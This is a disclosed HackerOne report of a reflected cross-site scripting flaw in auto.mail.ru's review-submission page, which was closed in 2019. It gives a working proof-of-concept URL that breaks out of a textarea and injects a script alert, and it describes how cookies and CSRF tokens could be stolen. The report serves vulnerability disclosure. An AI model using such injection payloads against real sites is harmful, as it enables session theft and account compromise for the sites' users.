@@ -1,0 +1,30 @@
+ReportLink:https://hackerone.com/reports/536341
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/mayurudiniya
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:07.05.2019 8:34:10
+
+Summary:
+Reflected XSS via GET parameters in https://auto.mail.ru/reviews/add_review/
+
+auto.mail.ru belongs to extended scope.
+##Description
+
+`https://auto.mail.ru` is vulnerable for xss. It is possible for an attacker to inject arbitrary JavaScript in application response
+
+##Step to reproduce
+
+1. Open the below link in Firefox.
+`https://auto.mail.ru/reviews/add_review/?firm_id=&csrf_token=AG_v2rsLIntEJUyXgRwSuoGq&id=&body_type=10&run_current=1234&design_grade=&comfortability_grade=&running_characteristics_grade=&ergonomics_grade=&reliability_grade=&service_availability_grade=&photos=&common_text=1234&advantages_text=25&problems_text=1234</textarea ><script>alert(document.domain)</script>&review_submit=`
+
+2. XSS will execute
+
+##Supporting Material/References:
+Attached vulnerable link.
+
+## Impact
+
+An attacker can bypass SOP with XSS and hence can read the sensitive data of application like a user cookies, csrf token and can perform other sort of attacks.
